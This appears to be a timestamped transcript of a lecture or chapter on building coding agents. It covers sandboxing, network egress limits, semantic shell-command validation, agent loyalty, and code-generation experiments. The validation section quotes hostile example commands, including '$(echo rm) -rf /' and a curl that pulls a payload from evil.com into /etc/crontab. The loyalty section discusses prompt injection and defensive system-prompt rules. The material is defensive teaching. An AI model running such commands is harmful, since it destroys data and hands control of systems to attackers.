+This is the item most easily overlooked and yet the most critical: no network by default, with a whitelist proxy admitting a limited set of destinations on demand (package sources, documentation sites, APIs the task explicitly needs).
+
+423
+01:05:24.631 --> 01:05:34.193
+Look back at item 3 of the Lethal Triad—"the ability to communicate externally": network egress control is precisely its execution-layer defense.
+
+424
+01:05:34.193 --> 01:05:42.806
+Even if a prompt injection succeeds and malicious code reads sensitive data inside the sandbox, with no egress the data cannot get out.
+
+425
+01:05:42.806 --> 01:05:45.793
+Scope of file-system isolation.
+
+426
+01:05:45.793 --> 01:06:08.568
+Mount the source directory read-only (the Agent modifies code through editing tools, and the generated patch is written to disk after review, or a copy is mounted into a writable workspace); a separate writable workspace directory holds the artifacts and intermediate files; credential files (~/.ssh, keys, tokens) are not mounted into the sandbox at all.
+
+427
+01:06:08.568 --> 01:06:11.343
+Resource quotas and timeouts.
+
+428
+01:06:11.343 --> 01:06:24.143
+CPU, memory, and disk quotas plus a timeout defend against infinite loops, fork bombs (processes that drag the system down by replicating themselves wildly), and unbounded disk writes.
+
+429
+01:06:24.143 --> 01:06:41.293
+One practical detail: a timeout or quota violation should return a structured error to the Agent ("execution was terminated after 120 seconds; the last output follows...") rather than silently killing the process, so that the Agent has a chance to correct its strategy on the next turn.
+
+430
+01:06:41.293 --> 01:06:46.368
+Safety: Semantic Parsing over Keyword Blacklists.*
+
+431
+01:06:46.540 --> 01:06:53.177
+Chapter 1 argued that the verification layer should rely on semantic understanding rather than pattern matching.
+
+432
+01:06:53.127 --> 01:06:58.552
+Shell command security validation is the most challenging application of this principle.
+
+433
+01:06:58.552 --> 01:07:16.265
+Simple keyword blacklists cannot cope with the combinatorial explosion of Shell—commands can bypass any static rules through pipes, subshells, variable expansion, etc. (e.g., if rm is blocked, an attacker can use $(echo rm) -rf / to bypass).
+
+434
+01:07:16.265 --> 01:07:32.540
+Production-grade Harnesses employ semantic parsing: identifying each command's argument types and parsing rules, including which flags consume following arguments, and recognizing attack patterns such as a seemingly harmless flag that hides a dangerous payload in its next argument.
+
+435
+01:07:32.540 --> 01:07:55.215
+For example, find / -name '.log' -exec rm {} \; embeds an rm delete operation through legitimate find command arguments; another example is curl -o /etc/crontab http://evil.com/payload, which appears to download a file but actually overwrites system scheduled tasks.
+
+436
+01:07:55.215 --> 01:08:02.702
+Semantic parsing can identify these nested dangerous operations, while simple command blacklists cannot capture them.
+
+437
+01:08:02.702 --> 01:08:09.977
+This security mechanism based on understanding rather than matching is a high-level implementation of the "constraint" function.
+
+438
+01:08:09.977 --> 01:08:14.815
+Whom Does the Agent Serve: Loyalty Under Multi-Party Delegation.
+
+439
+01:08:14.815 --> 01:08:25.752
+The security mechanisms above prevent "commands from being executed maliciously"; there is a subtler security issue—principal loyalty: whose side is the Agent actually on.
+
+440
+01:08:25.752 --> 01:08:40.852
+Models are trained with a naive default principle—"whoever is talking to me, I will try my best to help them"—but real-world Agents often operate under multi-party delegation: acting on behalf of a principal while dealing with third parties whose interests conflict.
+
+441
+01:08:40.852 --> 01:08:47.940
+An Agent negotiating a price on your behalf faces not a "user in need of help" but a negotiating opponent.
+
+442
+01:08:47.940 --> 01:08:56.077
+Here, "help whoever speaks" is a dangerous default—the opposing party can begin influencing your Agent simply by engaging it.
+
+443
+01:08:56.077 --> 01:09:02.690
+Putting frontier models into this situation reveals a clear loyalty spectrum, with both ends failing
+
+444
+01:09:02.690 --> 01:09:20.240
+This is particularly relevant to Coding Agents: untrusted content read from a repository, output returned by a tool, instructions sent by a third-party MCP server—all are "opponents" trying to turn the Agent—prompt injection is essentially an attempt at turning (Chapters 2 and 4).
+
+445
+01:09:20.240 --> 01:09:35.090
+The Harness must therefore explicitly nail down whom the Agent is loyal to: instructions from the principal carry the highest priority, while everything from external parties is downgraded by default to "data that may be consulted but carries no force of instruction.
+
+446
+01:09:35.090 --> 01:09:57.202
+In the system prompt, an effective loyalty code of conduct is: protect the principal's private information, including the fact that it exists; when refusing, do not enumerate protected details, because doing so may itself leak them; private bottom lines are not public positions; only execute the principal's clear and specific instructions; withstand repeated pressure.
+
+447
+01:09:57.202 --> 01:10:06.690
+Essentially, this is using the Harness to give the model a stance it lacks by default: absolute loyalty to the principal, and caution toward external parties.
+
+448
+01:10:06.690 --> 01:10:10.390
+Code: The Meta-Capability of a General Agent.
+
+449
+01:10:10.390 --> 01:10:18.202
+The previous section showed how to build a reliable Coding Agent—from architecture to tool implementation to harness engineering.
+
+450
+01:10:18.202 --> 01:10:23.140
+But the value of code generation extends far beyond writing programs.
+
+451
+01:10:23.308 --> 01:10:25.795
+What is a "meta-capability"?
+
+452
+01:10:25.745 --> 01:10:35.070
+An ordinary capability is an Agent's ability to do a specific thing—answer a question, call a certain API, generate a piece of text.
+
+453
+01:10:35.070 --> 01:10:49.208
+A meta-capability is an ability that "can create other abilities": the Agent uses it to write new tools, new constraints, and new forms of expression on the fly to accomplish a task, without needing to have all capabilities pre-built.
+
+454
+01:10:49.208 --> 01:11:09.570
+Code generation is precisely such a meta-capability—it is precise, executable, and composable, allowing it to produce new tools (scripts, API call sequences), new constraints (assertions, validation rules), and new forms of expression (HTML forms, PPTs, video frames).
+
+455
+01:11:09.570 --> 01:11:15.920
+For this reason, the role code plays in an Agent system goes far beyond "writing programs.
+
+456
+01:11:15.920 --> 01:11:23.820
+The next six sections demonstrate, one by one, six directions in which this meta-capability applies beyond programming.
+
+457
+01:11:23.820 --> 01:11:32.845
+These six directions are not merely a flat list; they progress from the inside out, organized by the object to which the meta-capability is applied:
+
+458
+01:11:32.845 --> 01:11:39.258
+Thinking Itself—using code to replace error-prone natural-language reasoning (Thinking Tools)
+
+459
+01:11:39.258 --> 01:11:46.058
+Business Rules—encoding vague policies as executable constraints (Business Rule Constraints)
+
+460
+01:11:46.058 --> 01:11:54.420
+Content Presentation—generating PPTs, videos, and visualization artifacts (Multimedia Generation)
+
+461
+01:11:54.420 --> 01:12:02.845
+System Interfaces—bridging heterogeneous APIs and automatically adapting to evolving data formats (System Adapters)
+
+462
+01:12:02.845 --> 01:12:09.645
+User Interfaces—dynamically constructing forms and interactive interfaces (Generative UI)
+
+463
+01:12:09.645 --> 01:12:16.445
+The Agent Itself—using code to create or repair new Agents, thereby enabling bootstrapping.
+
+464
+01:12:16.445 --> 01:12:18.783
+Code as a Thinking Tool.
+
+465
+01:12:18.783 --> 01:12:29.670
+LLMs are remarkable at understanding and generating natural language, yet fundamentally weak at precise calculation, symbolic manipulation, and strict logical deduction.
+
+466
+01:12:29.670 --> 01:12:39.558
+The reason: a model's thinking is inherently probabilistic and approximate, while mathematical and logical problems demand deterministic, exact answers.
+
+467
+01:12:39.558 --> 01:12:42.770
+One concrete comparison makes the point:
+
+468
+01:12:42.770 --> 01:12:47.508
+Refer to the companion repository for the complete code implementation.
+
+469
+01:12:47.508 --> 01:12:59.195
+Let the LLM be responsible for understanding the problem and writing the code, and let the code interpreter be responsible for precise calculation—this division of labor lets each play to its strengths.
+
+470
+01:12:59.195 --> 01:13:04.920
+Stephen Wolfram, the creator of Mathematica, offered a profound insight on this.
+
+471
+01:13:04.920 --> 01:13:19.345
+Before LLMs existed, there were already systems capable of precise mathematical computation—they worked using Symbolic Computation, i.e., processing expressions using mathematical symbols rather than approximate numerical values.
+
+472
+01:13:19.345 --> 01:13:35.058
+For example, a conventional calculator would approximate \sqrt{2} as 1.414, whereas a symbolic computation system would preserve the exact form \sqrt{2}, only converting to a decimal when necessary.
+
+473
+01:13:35.058 --> 01:13:43.195
+Wolfram Alpha, created by Wolfram, is such a system: users input a math problem, and it returns an exact answer.
+
+474
+01:13:43.195 --> 01:14:00.133
+However, its natural language understanding is quite fragile and its coverage is narrow—it relies on a built-in grammar parser that can only recognize a limited set of phrasings; a slight change in phrasing could cause parsing to fail, and it certainly cannot handle open-domain multi-step reasoning.
+
+475
+01:14:00.133 --> 01:14:08.745
+LLMs perfectly fill this gap—they excel at understanding various natural language expressions but are not good at precise calculation.
+
+476
+01:14:08.745 --> 01:14:32.208
+The new collaborative model is: let the LLM be responsible for understanding the user's natural language question, identifying the mathematical or logical structure within it, and translating it into a formal language (such as the Mathematica language or Python's SymPy library); then hand it over to a dedicated symbolic computation engine or constraint solver for execution to obtain precise results.
+
+477
+01:14:32.356 --> 01:14:41.468
+Experiment 5-3 intermediate difficulty, two stars: : Using Code Generation Tools to Improve Mathematical Problem-Solving Ability
+
+478
+01:14:41.418 --> 01:14:48.968
+Experiment Goal: Verify the accuracy improvement of an Agent's mathematical thinking when assisted by a Code Interpreter.
+
+479
+01:14:48.968 --> 01:14:57.743
+Technical Approach: Equip the Agent with a Python sandbox containing mathematical libraries like sympy, numpy, and scipy.
+
+480
+01:14:57.743 --> 01:15:11.818
+When the Agent encounters a math problem, it formalizes it into Python code: sympy for symbolic computation (calculus, equation solving), scipy for numerical optimization, numpy for matrix operations.
+
+481
+01:15:11.818 --> 01:15:17.006
+The generated code is executed in the sandbox to return precise results.
+
+482
+01:15:17.006 --> 01:15:25.581
+Acceptance Criteria: Evaluate using AIME-style problems (modeled after the American Invitational Mathematics Examination).
+
+483
+01:15:25.581 --> 01:15:34.643
+Compare the accuracy of pure chain-of-thought reasoning with that of code-assisted reasoning; the code-assisted mode should achieve significantly higher accuracy.
+
+484
+01:15:34.643 --> 01:15:41.506
+Check whether the code correctly uses the mathematical libraries and whether the solution process is logically clear.
+
+485
+01:15:41.506 --> 01:15:50.006
+Experiment 5-4 intermediate difficulty, two stars: : Using Code Generation Tools to Improve Logical Reasoning Ability
+
+486
+01:15:50.006 --> 01:15:56.918
+Experiment Goal: Assess the Agent's ability to perform logical reasoning with the help of constraint-solving code.
+
+487
+01:15:56.918 --> 01:16:03.318
+Technical Approach: Equip the Agent with a Code Interpreter containing the python-constraint library.
+
+488
+01:16:03.318 --> 01:16:20.231
+The Agent translates logic puzzles, such as Knights and Knaves problems, into formal constraint models: it identifies the variables (each islander's identity), encodes rules such as "knights tell the truth" as constraints, and invokes the solver to find a satisfying assignment.
+
+489
+01:16:20.231 --> 01:16:25.406
+Acceptance Criteria: Evaluate using the K&K Puzzle dataset.
+
+490
+01:16:25.406 --> 01:16:33.906
+The code-assisted mode should achieve a solution accuracy of over 90%, significantly higher than when reasoning without code assistance.
+
+491
+01:16:33.906 --> 01:16:40.106
+This experiment also reveals a more general pattern: model and harness trade off against each other.
+
+492
+01:16:40.106 --> 01:16:48.668
+When the model is strong enough, the harness can be thinner—the model reasons correctly on its own, and the gain from a code solver narrows.
+
+493
+01:16:48.668 --> 01:16:57.218
+When the model is weaker, the harness must do more—offloading the key logical reasoning to code and constraint solvers to guarantee correctness.
+
+494
+01:16:57.218 --> 01:17:18.606
+That is why this experiment deliberately uses a weaker model, to amplify the contrast: a weaker model frequently makes calculation errors when reasoning without code assistance, and code assistance lifts accuracy dramatically; a sufficiently strong reasoning model often solves every puzzle without code assistance, and the gain from code assistance converges to near zero.
+
+495
+01:17:18.606 --> 01:17:33.643
+How thick the harness should be, then, depends on where your model's capability boundary lies—a premise easily overlooked when evaluating any Agent technique: the same harness, paired with models of different strength, can support opposite conclusions.
+
+496
+01:17:33.643 --> 01:17:36.793
+Code as a Constraint for Business Rules.
+
+497
+01:17:36.793 --> 01:17:42.231
+This section is a direct response to the Harness Engineering section earlier in this chapter.
+
+498
+01:17:42.231 --> 01:17:57.206
+One of the core principles of the Harness is "Constraints: Encoded, Not Documented"—transforming rules from natural language documentation into executable code, making them mandatory constraints on system behavior rather than advisory guidelines.
+
+499
+01:17:57.206 --> 01:18:02.943
+Code generation enables the Agent to autonomously complete this transformation process.
+
+500
+01:18:02.943 --> 01:18:10.181
+Business rules, workflows, and decision logic described only in natural language are riddled with ambiguity.
+
+501
+01:18:10.181 --> 01:18:13.243
+What is a "reasonable refund request"?
+
+502
+01:18:13.243 --> 01:18:15.918
+What counts as an "emergency"?
+
+503
+01:18:15.918 --> 01:18:25.393
+The boundaries resist natural-language definition—"refundable within 7 days of purchase" sounds clear, but are those calendar days or business days?
+
+504
+01:18:25.393 --> 01:18:28.956
+Does "purchase" mean order placement or shipment?
+
+505
+01:18:28.956 --> 01:18:38.443
+Code, by contrast, is an unambiguous, executable representation of knowledge—it either runs or throws an error; there is no in-between.
+
+506
+01:18:38.443 --> 01:18:42.018
+Precisely Expressing Complex Business Rules.
+
+507
+01:18:42.018 --> 01:18:47.993
+Natural Language Rules vs. Codified Rules: Complementary, Not Interchangeable
+
+508
+01:18:48.148 --> 01:19:01.760
+Writing rules in the system prompt allows the model to explain policies to users, identify policy-compliant alternatives (e.g., "rebook instead of cancel"), and make a preliminary feasibility judgment before calling a tool.
+
+509
+01:19:01.710 --> 01:19:22.760
+Codifying rules as validation tools offers three advantages: precise, unambiguous decision logic; deterministic execution, so the same input always produces the same output; and effective handling of complex rule combinations, such as multi-condition Boolean logic, time calculations, and cross-data-source validation.
+
+510
+01:19:22.760 --> 01:19:36.985
+In practice, they should be used together: the system prompt contains natural language rules for understanding and communication, while key decision points are equipped with codified validation tools acting as "gatekeepers" to ensure compliance.
+
+511
+01:19:36.985 --> 01:19:43.160
+The true value of codified rules is not token efficiency but preventing irreversible mistakes.
+
+512
+01:19:43.160 --> 01:19:49.948
+Canceling an order, transferring funds, or deleting data may be impossible to undo once executed.
+
+513
+01:19:49.948 --> 01:19:58.823
+Codified validation places a last line of defense in front of the operation, and the value of that guarantee far outweighs its implementation cost.
+
+514
+01:19:58.823 --> 01:20:05.823
+Combining Validation with Execution: Checklists Guide Reasoning; Ground-Truth Validation Guards the Gate
+
+515
+01:20:05.823 --> 01:20:11.960
+Instead of building a separate validation tool, put the validation inside the execution tool.
+
+516
+01:20:11.960 --> 01:20:23.360
+Consider the airline cancellation policy from τ-bench, a benchmark designed to evaluate tool use and policy compliance in simulated airline and e-commerce customer-service scenarios:
+
+517
+01:20:23.360 --> 01:20:32.860
+Here is the structured JSON representation exchanged with the API, defining the model parameters, conversation history, and tool definitions.
+
+518
+01:20:32.860 --> 01:20:36.898
+The value of this design should be understood on two levels.
+
+519
+01:20:36.898 --> 01:20:40.835
+First level: parameters as a thinking checklist.
+
+520
+01:20:40.835 --> 01:20:56.148
+The tool description lists the complete cancellation policy and requires the model to "query order details and check each condition one by one before calling"; the optional expected_ parameters further prompt the model to explicitly write out its own reasoning.
+
+521
+01:20:56.148 --> 01:21:08.123
+To fill in these parameters, the model must first call the query tool to get order details and verify each condition one by one — filling in these parameters therefore acts as a mandatory checklist.
+
+522
+01:21:08.123 --> 01:21:22.898
+When the model finds that the cabin class is economy and insurance has not been purchased, it may notice Rule 5 while preparing the call and therefore avoid initiating it, instead directly telling the user "Economy class without insurance cannot be cancelled.
+
+523
+01:21:22.898 --> 01:21:27.360
+Consider purchasing insurance before cancelling or changing your booking.
+
+524
+01:21:27.360 --> 01:21:33.960
+This layer guides reasoning and reduces invalid calls; however, it is not a security boundary.
+
+525
+01:21:33.960 --> 01:21:40.398
+The expected_ values are only self-reported claims, never facts trusted by the server.
+
+526
+01:21:40.398 --> 01:21:45.360
+Second level: server-side ground-truth validation as the gatekeeper.
+
+527
+01:21:45.360 --> 01:21:58.348
+Note the key design in the code: cabin class, insurance status, booking time, segment usage, and flight status are all queried from the database by the server; the current time comes from the server clock.
+
+528
+01:21:58.348 --> 01:22:02.860
+No policy fact comes from the model's self-reported parameters.
+
+529
+01:22:02.860 --> 01:22:17.435
+This is not needless redundancy: the model may hallucinate or be manipulated by prompt injection, and—as the earlier Lethal Triad analysis showed—an Agent operating within a single context cannot reliably validate its own behavior.
+
+530
+01:22:17.435 --> 01:22:30.735
+If cabin_class, has_insurance, and even current_time were designed as parameters filled in by the model, a single false value—whether accidental or induced—could bypass the gatekeeper.
+
+531
+01:22:30.735 --> 01:22:46.148
+The last line of defense must be built on data that the model cannot forge — this is consistent with the earlier stance that "critical operations require independent verification": independence refers not only to an independent model but also to an independent data source.
+
+532
+01:22:46.300 --> 01:23:07.900
+The three-tier safeguard is thus complete: (1) natural language rules in the system prompt aid understanding and explanation; (2) tool descriptions and parameter design serve as a checklist, guiding the model to explicitly verify conditions before calling; (3) server-side code-based validation using database ground truth acts as the final gatekeeper.
+
+533
+01:23:07.850 --> 01:23:15.250
+The first two tiers reduce the occurrence of errors, and the third ensures that errors do not become irreversible losses.
+
+534
+01:23:15.250 --> 01:23:24.350
+Experiment 5-5 intermediate difficulty, two stars: : Small models improve rule execution accuracy through code-based knowledge
+
+535
+01:23:24.350 --> 01:23:37.037
+Experiment objective: Verify that encoding complex business rules in code significantly improves the accuracy and consistency with which a small model (Qwen3-4B) executes those rules.
+
+536
+01:23:37.037 --> 01:23:43.662
+Technical approach: Design a controlled experiment based on the τ-bench airline customer service scenario.
+
+537
+01:23:43.662 --> 01:23:49.225
+Control group: Pure natural language rules, relying on the model's own reasoning.
+
+538
+01:23:49.225 --> 01:24:18.387
+Experimental group: Three-tier safeguard — system prompt retains natural language rules; tool description lists the complete policy and uses optional expected_ parameters to guide the model to check each condition one by one before calling (checklist); the tool internally performs code-based validation based on simulated database ground truth (all policy facts are obtained from the database, time is taken from the server clock, and the model's self-reported parameters are not trusted).
+
+539
+01:24:18.387 --> 01:24:27.562
+Evaluation metrics: task success rate, number of policy violations, number of invalid tool calls, user experience.
+
+540
+01:24:27.562 --> 01:24:33.250
+Expected results: The experimental group significantly outperforms the control group.
+
+541
+01:24:33.250 --> 01:24:44.837
+More importantly, the model autonomously identifies policy violations while preparing parameters and offers alternatives without calling the tool, demonstrating the value of parameters as a checklist.
+
+542
+01:24:44.837 --> 01:24:56.012
+Finally, measure the mismatch rate between self-reported expected_ values and database ground truth to show why server-side validation is necessary for catching reasoning errors.
+
+543
+01:24:56.012 --> 01:24:58.937
+Code-Driven Multimedia Generation.
+
+544
+01:24:58.937 --> 01:25:05.412
+The creation of many complex documents is essentially the organization and presentation of structured data.
+
+545
+01:25:05.412 --> 01:25:19.725
+Whether it's a presentation, a technical report, or an interactive application, the underlying structure is defined by code — HTML describes the structure, CSS controls the style, and JavaScript implements interactivity.
+
+546
+01:25:19.725 --> 01:25:30.012
+Traditional document creation relies on GUI-based WYSIWYG editors, which are a poor fit for Agents because they require visual interpretation and precise pointer placement.
+
+547
+01:25:30.012 --> 01:25:44.262
+Through code generation, Agents bypass the challenge of visual positioning and gain precise control over documents — the position, style, and content of each element are clearly defined and can be modified and optimized programmatically.
+
+548
+01:25:44.262 --> 01:25:47.062
+PPT Generation Agent.
+
+549
+01:25:47.062 --> 01:25:50.862
+PPT creation is notoriously laborious.
+
+550
+01:25:50.862 --> 01:25:59.900
+A typical academic presentation runs to dozens of slides, each demanding careful layout, distilled key points, and well-chosen charts.
+
+551
+01:25:59.900 --> 01:26:07.112
+Reframe PPT creation as a code generation problem, however, and much of the complexity falls away.
+
+552
+01:26:07.112 --> 01:26:15.600
+Modern presentation frameworks such as Slidev embrace an elegant design philosophy: define the content in Markdown and HTML.
+
+553
+01:26:15.600 --> 01:26:23.075
+Creating a slide takes a few lines of concise markup, and the framework handles rendering, layout, and animation.
+
+554
+01:26:23.075 --> 01:26:27.987
+For an Agent that has mastered code generation, this is ideal terrain.
+
+555
+01:26:27.987 --> 01:26:34.775
+As illustrated in Figure 5-5: Proposer-Reviewer mechanism for PPT generation.
+
+556
+01:26:34.775 --> 01:26:38.025
+Generating the code is not enough, though.
+
+557
+01:26:38.025 --> 01:26:51.200
+Once the Agent has written the code, it has no idea how the result actually renders: content too crowded, text overflowing, images the wrong size — none of this is visible until the slides are actually rendered.
+
+558
+01:26:51.200 --> 01:27:01.450
+Therefore, a Proposer-Reviewer mechanism (shown in Figure 5-5) is needed to assign code generation and quality review to two independent Agents:
+
+559
+01:27:01.450 --> 01:27:11.012
+Proposer Agent is responsible for generating Slidev code, understanding the logical structure of the content, and organizing it into well-structured slides.
+
+560
+01:27:11.164 --> 01:27:44.839
+Reviewer Agent runs the code to render each page as an image, uses a Vision LLM (a multimodal large model that can "see" images) to evaluate the rendered slides for content density, readability, layout quality, and visual appeal, and generates structured improvement suggestions — not vague "doesn't look good," but specific, actionable guidance (e.g., "Page 3: too much content, consider splitting"; "Page 7: code block font too small, suggest increasing to 14pt"), including fields such as page
+
+561
+01:27:44.839 --> 01:27:48.101
+number, issue type, and severity.
+
+562
+01:27:48.101 --> 01:27:55.726
+The Proposer receives the feedback, interprets it, modifies the code, and resubmits the new version to the Reviewer.
+
+563
+01:27:55.726 --> 01:28:05.051
+This cycle continues until the presentation meets the quality standard or the maximum number of iterations (e.g., five rounds) is reached.
+
+564
+01:28:05.051 --> 01:28:19.939
+Quality meets the standard" and "maximum rounds" are exactly the two kinds of explicit stop conditions Loop Engineering calls for: the former lets the reviewer decide the goal has been reached; the latter is a budget cap that keeps the loop from running away.
+
+565
+01:28:19.939 --> 01:28:32.501
+The iterative loop here and the pre-approval mechanism in Chapter 4 both follow the Proposer-Reviewer pattern introduced in Chapter 1: generation and review are separated, with two models evaluating independently.
+
+566
+01:28:32.501 --> 01:28:38.564
+In Loop Engineering terms, these are separate "maker" and "verifier" sub-agents.
+
+567
+01:28:38.564 --> 01:28:42.351
+The two applications differ in purpose and workflow.
+
+568
+01:28:42.351 --> 01:28:55.264
+Chapter 4 uses the pattern to approve or reject a single irreversible operation; here, it drives iterative content improvement over multiple rounds, with the Reviewer seeing rendered output unavailable to the Proposer.
+
+569
+01:28:55.264 --> 01:29:07.339
+The core design principles are consistent (shared goal constraints, using different model families to reduce the probability of similar errors, feedback as a special event added to the Proposer's trajectory).
+
+570
+01:29:07.339 --> 01:29:26.164
+The core advantage of using a dual-agent division of labor rather than a single-agent loop lies in context management: the Reviewer processes only the latest version's rendered images, unaffected by historical versions; the Proposer only accumulates structured text feedback, consuming fewer tokens and making reasoning easier.
+
+571
+01:29:26.164 --> 01:29:35.601
+A single-agent solution would need to accumulate rendered images from multiple rounds for dozens of pages in the same context, quickly exceeding the context limit.
+
+572
+01:29:35.601 --> 01:29:47.651
+This mechanism will be reused in subsequent experiments on video editing and log visualization; Chapter 10 will further explore other multi-agent collaboration modes beyond the Proposer-Reviewer paradigm.
+
+573
+01:29:47.812 --> 01:29:55.474
+Experiment 5-6 intermediate difficulty, two stars: : Automatic PPT generation from papers
+
+574
+01:29:55.424 --> 01:30:07.249
+Experiment objective: Automatically generate high-quality presentations from academic papers, verifying the effectiveness of the Proposer-Reviewer mechanism in content creation quality control.
+
+575
+01:30:07.249 --> 01:30:10.912
+Technical approach: Use the Slidev framework.
+
+576
+01:30:10.912 --> 01:30:22.649
+The Proposer Agent reads the paper PDF, extracts chapter structure, core arguments, and figures, plans the PPT structure, and generates Slidev code page by page.
+
+577
+01:30:22.649 --> 01:30:35.349
+Key step: The Reviewer Agent renders each slide and captures a screenshot, then uses a Vision LLM to evaluate the result for text overflow, content crowding, and inappropriate image sizing.
+
+578
+01:30:35.349 --> 01:30:40.524
+The Proposer and Reviewer iterate until the presentation meets the quality standard.
+
+579
+01:30:40.524 --> 01:30:46.912
+Acceptance criteria: Generate 10-20 slides covering the paper's main contributions.
+
+580
+01:30:46.912 --> 01:30:51.724
+Include at least three figures from the paper that match the accompanying text.
+
+581
+01:30:51.724 --> 01:30:55.724
+No text overflow in rendering, reasonable layout.
+
+582
+01:30:55.724 --> 01:31:03.437
+Compare context consumption and generation quality between single-agent self-review and a Proposer-Reviewer division of labor.
+
+583
+01:31:03.437 --> 01:31:11.387
+Experiment 5-7 intermediate difficulty, two stars: : Automatic generation of paper explanation videos
+
+584
+01:31:11.387 --> 01:31:22.049
+Experiment objective: Extend PPT generation capabilities, combining visual and auditory channels to achieve automatic generation of explanation videos.
+
+585
+01:31:22.049 --> 01:31:43.574
+Technical approach: Building on the presentation workflow from Experiment 5-6, the Agent also generates conversational narration for each slide—guiding the viewer rather than repeating the slide text—uses TTS (text-to-speech) to synthesize the audio, and combines the slide images and audio with FFmpeg to produce the final video.
+
+586
+01:31:43.574 --> 01:31:54.912
+Acceptance criteria: Produce a video lasting 5 to 15 minutes in which each slide's display time precisely matches its narration and the narration corresponds to the visual elements.
+
+587
+01:31:54.912 --> 01:32:01.462
+As illustrated in Figure 5-6: End-to-end pipeline from paper to explanation video.
+
+588
+01:32:01.462 --> 01:32:03.774
+Video Editing Agent.
+
+589
+01:32:03.774 --> 01:32:16.237
+Editing video through a general-purpose Computer Use interface presents a fundamental obstacle: video-editing GUIs are extraordinarily complex — dense with timelines, layers, and effects panels.
+
+590
+01:32:16.237 --> 01:32:24.662
+An Agent must locate and manipulate these elements with a mouse and keyboard, which requires exact coordinates that models struggle to produce.
+
+591
+01:32:24.662 --> 01:32:31.049
+Reframing video editing as API calls and code generation cuts the complexity dramatically.
+
+592
+01:32:31.049 --> 01:32:51.512
+Many professional software tools (such as Blender — an open-source 3D creation and video compositing tool that supports Python scripting; FFmpeg — the command-line Swiss Army knife for audio/video processing) provide programmatic API interfaces that expose core functionality in a structured, composable manner.
+
+593
+01:32:51.512 --> 01:33:06.812
+For example, the Blender Python API allows precise control over operations such as importing, trimming, arranging, adding transition effects, and mixing audio for video clips, with each operation corresponding to a clear function call.
+
+594
+01:33:06.812 --> 01:33:16.424
+For an Agent, converting natural language requirements into API calls is far easier than understanding a GUI interface and simulating mouse clicks.
+
+595
+01:33:16.424 --> 01:33:32.274
+Similar to PPT generation, video editing also adopts the Proposer-Reviewer mechanism — the Proposer Agent generates Blender scripts, the Reviewer Agent renders keyframes and uses a Vision LLM to check the effect, providing feedback for modification.
+
+596
+01:33:32.274 --> 01:33:39.374
+Experiment 5-8 intermediate difficulty, two stars: : API-based intelligent video editing
+
+597
+01:33:39.374 --> 01:33:53.449
+Experiment objective: Verify the Agent's ability to perform video editing by generating Blender Python API code, and evaluate the role of the vision-feedback-based Proposer-Reviewer mechanism in multimedia content processing.
+
+598
+01:33:53.620 --> 01:34:12.582
+Core challenge: Understanding the user's natural language editing requirements and converting them into precise sequences of API calls, handling various editing operations (trimming, merging, subtitles, audio track mixing, visual effects), and ensuring the generated Python script executes correctly.
+
+599
+01:34:12.532 --> 01:34:23.270
+After the Proposer Agent writes the code, it cannot directly assess the resulting video; it must rely on the Reviewer Agent to render and use a Vision LLM to check keyframes.
+
+600
+01:34:23.270 --> 01:34:36.845
+Technical approach: The user provides video material (e.g., raw footage containing scenes like surfing, hiking, skiing) and describes requirements in natural language (e.g., "Extract the surfing segment").
+
+601
+01:34:36.845 --> 01:34:42.982
+The Proposer Agent uses a video analysis sub-agent with a two-step localization strategy:
+
+602
+01:34:42.982 --> 01:34:51.782
+Step 1, coarse localization: Call the sub-agent with the video path, a 10-second frame-sampling interval, and the target question.
+
+603
+01:34:51.782 --> 01:35:04.645
+The sub-agent uses ffmpeg to capture frames at that interval, sends the screenshots and question to a Vision LLM, and returns the scene interval (e.g., "Surfing is between 40-110 seconds").
+
+604
+01:35:04.645 --> 01:35:14.307
+Step 2, fine-grained localization: Call the sub-agent again over a narrower range and sample one frame per second to locate the boundaries precisely.
+
+605
+01:35:14.307 --> 01:35:22.220
+Encapsulating video analysis as a sub-agent prevents a large number of screenshots from occupying the main Agent's context.
+
+606
+01:35:22.220 --> 01:35:27.332
+After localization, the Proposer generates the Blender API script.
+
+607
+01:35:27.332 --> 01:35:37.195
+The Reviewer Agent performs a quick preview, checks keyframes, and provides feedback for modification, iterating until the standard is met before full rendering.
+
+608
+01:35:37.195 --> 01:35:46.770
+Acceptance criteria: The Agent can accurately identify different scenes in the video and correctly generate editing scripts based on natural language instructions.
+
+609
+01:35:46.770 --> 01:35:51.357
+The start and end points are accurate (error within 3 seconds).
+
+610
+01:35:51.357 --> 01:36:01.195
+If the instructions include special effects requirements (slow motion, transitions, subtitles), the generated video correctly applies the effects.
+
+611
+01:36:01.195 --> 01:36:09.345
+The Reviewer Agent can detect obvious errors (missing key content, including irrelevant segments) and trigger corrections.
+
+612
+01:36:09.345 --> 01:36:14.607
+The final output video file has the correct format and meets expected quality.
+
+613
+01:36:14.607 --> 01:36:20.757
+3D and Industrial Parts: The Boundary Between Code Generation and Generative Models.
+
+614
+01:36:20.757 --> 01:36:42.232
+When it comes to "generating a thing," the Agent faces two routes: one is writing code to construct it precisely (CadQuery, OpenSCAD, Blender API); the other is calling a 3D generative model directly (text/image-to-3D models like Hunyuan 3D, which belong to the same diffusion family as text-to-image models).
+
+615
+01:36:42.232 --> 01:36:50.220
+Many people wrestle with the question: when should you use code generation, and when should you use an image/3D generative model?
+
+616
+01:36:50.220 --> 01:36:55.257
+First, check whether the artifact has a compact, precise description.
+
+617
+01:36:55.257 --> 01:36:58.207
+Industrial parts naturally have one.
+
+618
+01:36:58.207 --> 01:37:09.995
+A flange is fully defined by five or six parameters—outer diameter, thickness, bolt-circle diameter, hole diameter, hole count—and code is a lossless expression of it.
+
+619
+01:37:09.995 --> 01:37:19.382
+A potted plant, a Taihu rock, or a human face is different—they have countless details, and their intrinsic complexity is nearly unbounded.
+
+620
+01:37:19.382 --> 01:37:23.832
+Second, check the precision requirements and verifiability.
+
+621
+01:37:23.832 --> 01:37:34.857
+Every dimension of a part is a hard constraint—hole diameter 5mm, tolerance ±0.05mm; off by a hair and it is scrap.
+
+622
+01:37:34.857 --> 01:37:45.395
+A code-generated part can be verified programmatically: load the mesh, measure the outer diameter and hole positions, and check them item by item against the specification.
+
+623
+01:37:45.395 --> 01:37:51.532
+A part produced by a 3D generative model cannot be checked against the specification directly.
+
+624
+01:37:51.700 --> 01:37:57.200
+The two routes differ in one more practical way: representation and editability.
+
+625
+01:37:57.150 --> 01:38:09.375
+Manufacturing workflows demand B-rep (boundary representation) parametric solids—the STEP file stores the feature tree and dimensional parameters and can drive CNC machining directly.
+
+626
+01:38:09.375 --> 01:38:19.350
